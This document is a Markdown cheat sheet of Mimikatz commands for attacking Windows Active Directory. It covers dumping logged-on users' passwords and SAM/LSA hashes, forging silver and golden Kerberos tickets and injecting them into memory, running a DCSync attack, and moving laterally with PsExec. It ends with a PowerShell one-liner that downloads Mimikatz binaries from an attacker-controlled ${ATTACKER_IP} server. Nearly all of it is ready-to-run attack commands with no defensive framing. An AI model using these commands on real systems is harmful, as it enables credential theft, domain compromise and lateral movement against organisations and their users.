# Mimikatz

cheat sheet 
[mimikatz cheatsheet](https://kashz.gitbook.io/kashz-jewels/cheatsheet/mimikatz)

## Silver Tickets

Using an admin powershell and open mimikatz:

```
privilege::debug
```

and follow up with:

```
token::elevate
```

get passwords of logged on users:

```
sekurlsa::logonpasswords
```
Now, if we get the NTLM hash of an SPN with privleges to a service we want access to, we can forge a silver ticket.

```
kerberos::golden /sid:${DOMAIN_SID} /domain:${DOMAIN} /target:${RHOST_IP} /service:http /rc4:${NTLM_HASH} /user:${DOMAIN_USER} /ptt
```
The `$DOMAIN_SID` can be retrieved by doing `whoami /user` from a domain user and getting everything but the last section (which identifies the user).
Note that the user argument just has to be a valid user from the domain.
What determines the access rights is the NTLM hash and not the user, so you can even put the current user.

Afterwards, do `exit` and check that the ticket is loaded into memory with `klist`.

We can now use it to move laterally with the techniques mentioned [here](./lateral-movement.md).


## Golden Tickets

Golden Tickets are just Silver Tickets for the krbtgt account.
This grants access to all services using Kerberos authentication.

Another example of the above command (note we pass the NTLM hash to `/krbtgt` and don't specify a specific target):


```
kerberos::golden /sid:${DOMAIN_SID} /domain:${DOMAIN} /krbtgt:${KRBTGT_NTLM} /user:${DOMAIN_USER} /ptt

```
Followed up with:

```
misc::cmd
```

Now, eg.  `PsExec` can be run from CMD with the ticket.


## DSYNC

mimikatz can help us attempt to get the NTLM of a user in the domain by performing a dsync attack:
(requires local admin).

```
lsadump::dcsync /user:${DOMAIN}\${USER}
```
## Dump hashes

Dump with either:
```
lsadump::sam
lsadump::lsa [/inject | /patch]
```

## Transfering mimikatz files from http server in Powershell

```powershell
iwr -uri http://${ATTACKER_IP}:8000/mimidrv.sys -outfile mimidrv.sys; iwr -uri http://${ATTACKER_IP}:8000/mimikatz.exe -outfile mimikatz.exe; iwr -uri http://${ATTACKER_IP}:8000/mimilib.dll -outfile mimilib.dll; iwr -uri http://${ATTACKER_IP}:8000/mimispool.dll -outfile mimispool.dll
```
